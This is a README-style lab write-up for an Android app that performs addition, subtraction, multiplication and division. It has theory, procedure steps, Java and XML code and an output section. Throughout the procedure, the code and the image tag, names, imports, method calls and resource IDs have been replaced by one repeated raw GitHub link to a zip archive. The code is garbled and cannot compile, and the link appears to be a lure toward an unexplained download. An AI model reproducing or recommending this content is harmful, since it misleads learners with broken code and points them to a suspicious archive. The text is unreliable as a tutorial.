# DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-

## AIM:
To develop an android application to perform mathematical operation.

## APPARATUS REQUIRED:
ØComputer
ØAndroid studio software


## THEORY:
The platform uses signed two's complement integer arithmetic with int and long primitive types. The developer should choose the primitive type to ensure that arithmetic operations consistently produce correct results, which in some cases means the operations will not overflow the range of values of the computation. The best practice is to choose the primitive type and algorithm to avoid overflow. In cases where the size is int or long and overflow errors need to be detected, the methods add, subtract multiply, and throw an Arithmetic exception when the results overflow. For other arithmetic operations such as divide, absolute value, increment by one, decrement by one, and negation, overflow occurs only with a specific minimum or maximum value and should be checked against the minimum or maximum as appropriate.



## PROCEDURE:
1. Open Android Studio and then click on File -> New -> New project. 2. Then type the application name as “https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip″ and click Next.
3. Then select the Minimum SDK as shown below and click next. 4. Then select the Empty Activity and click next.
5. Finally click Finish.
6. Click on app -> java -> https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip -> https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip
7. Now click on Text and type the program, so now the programming part of the main activity is completed.
8. Click on app -> res -> layout -> https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip
9. Now click on Text and type the program, so now the designing part of Activity main is also completed.
10. Select the suitable available device to display the output. 11. Now run the application to see the output. 


## PROGRAM:
## https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip
```
 https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip

 

package https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip;

 

import https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip; import https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip; import https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip; import https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip;

import https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip;

import https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip;

 

public class MainActivity extends AppCompatActivity { EditText num1, num2;

Button addBtn, subBtn, mulBtn, divBtn; TextView result;

@Override

 

protected void onCreate(Bundle savedInstanceState) { https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip(savedInstanceState); setContentView(https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip);

num1 = findViewById(https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip); num2 = findViewById(https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip); addBtn = findViewById(https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip); subBtn = findViewById(https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip); mulBtn = findViewById(https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip); divBtn = findViewById(https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip); result = findViewById(https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip);

https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip(v -> operate('+')); https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip(v -> operate('-')); https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip(v -> operate('*')); https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip(v -> operate('/'));

}

 

private void operate(char op) {

double n1 = https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip(https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip().toString()); double n2 = https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip(https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip().toString()); double res = 0;

switch (op) {

case '+': res = n1 + n2; break; case '-': res = n1 - n2; break; case '*': res = n1 * n2; break;

case '/': res = n2 != 0 ? n1 / n2 : 0; break; }

https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip("Result: " + res); }

}
```
## https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip
```
<?xml version="1.0" encoding="utf-8"?>

 

<LinearLayout xmlns:android="https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip" android:orientation="vertical" android:layout_width="match_parent" android:layout_height="match_parent" android:padding="16dp">

 

<EditText android:id="@+id/num1" android:hint="Enter Number 1" android:layout_width="match_parent" android:layout_height="wrap_content"

android:inputType="numberDecimal"/>

 

<EditText android:id="@+id/num2" android:hint="Enter Number 2" android:layout_width="match_parent" android:layout_height="wrap_content"

android:inputType="numberDecimal"/>

 

<LinearLayout android:orientation="horizontal" android:layout_width="match_parent" android:layout_height="wrap_content">

 

<Button android:id="@+id/addBtn" android:text="+" android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content"/>

 

<Button android:id="@+id/subBtn" android:text="-" android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content"/>

 

<Button android:id="@+id/mulBtn" android:text="*" android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content"/>

 

<Button android:id="@+id/divBtn" android:text="/" android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content"/>

 

</LinearLayout>

 

<TextView android:id="@+id/result" android:text="Result:" android:layout_width="match_parent" android:layout_height="wrap_content"

android:paddingTop="10dp"/>

 

</LinearLayout>
```




## OUTPUT:


<img width="1911" height="1018" alt="calcc" src="https://github.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-PERFORM-MATHEMATICAL-OPERATION.-/raw/refs/heads/main/decad/T-DEVELOPIN-PERFOR-APPLICATIO-OPERATIO-A-MATHEMATICA-ANDROI-2.0.zip" />



## RESULT:
Thus, the Android app for basic operations (addition, subtraction, multiplication, and division) is developed and the output is verified.

